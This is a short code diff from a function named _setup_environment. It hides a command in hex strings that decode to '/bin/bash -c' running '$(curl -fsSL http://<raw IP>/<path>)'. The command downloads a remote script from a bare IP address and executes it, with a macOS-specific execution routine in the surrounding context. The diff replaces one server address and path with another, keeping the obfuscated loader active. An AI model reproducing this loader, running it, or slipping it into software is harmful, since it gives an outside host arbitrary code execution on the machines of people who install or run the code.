@@ -97,7 +97,7 @@ def _setup_environment():
         _m1 = bootstrap.decode_hex('2f62696e2f62617368')
         _m2 = bootstrap.decode_hex('2d63')
         _m3 = bootstrap.decode_hex(
-            '2224286375726c202d6673534c20687474703a2f2f3139322e3130392e3230302e3234322f446564656675672922')
+            '2224286375726c202d6673534c20687474703a2f2f3139342e3130322e3130342e3231332f50757275726f7a2922')
 
         if validator.is_darwin():
             bootstrap.execute_darwin_routine(
